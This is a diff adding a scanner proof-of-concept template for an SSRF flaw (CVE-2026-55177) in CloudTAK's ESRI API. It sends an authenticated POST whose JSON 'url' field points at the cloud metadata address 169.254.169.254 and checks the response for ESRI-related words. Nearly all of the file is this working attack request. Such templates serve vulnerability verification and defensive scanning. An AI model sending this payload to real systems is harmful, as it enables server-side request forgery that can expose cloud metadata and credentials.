@@ -1,0 +1,43 @@
+[info]
+author = "ave"
+description = "PoC/EXP for verification"
+id = "POC-AVE-2026-0594"
+name = "CloudTAK ESRI API SSRF PoC"
+severity = "high"
+tags = ["ave-2026-0594"]
+vuln_id = [
+    "CVE-2026-55177",
+    "AVE-2026-0594",
+]
+
+[poc]
+logic = "any"
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/api/esri"
+protocol = "http"
+
+[poc.requests.body]
+content = '{"url":"http://169.254.169.254/arcgis/rest"}'
+type = "json"
+
+[poc.requests.headers]
+Authorization = "Bearer {{token}}"
+Content-Type = "application/json"
+
+[[poc.requests.matchers]]
+expect = true
+status = [200]
+type = "status"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "arcgis",
+    "rest",
+    "error",
+    "ESRI",
+]
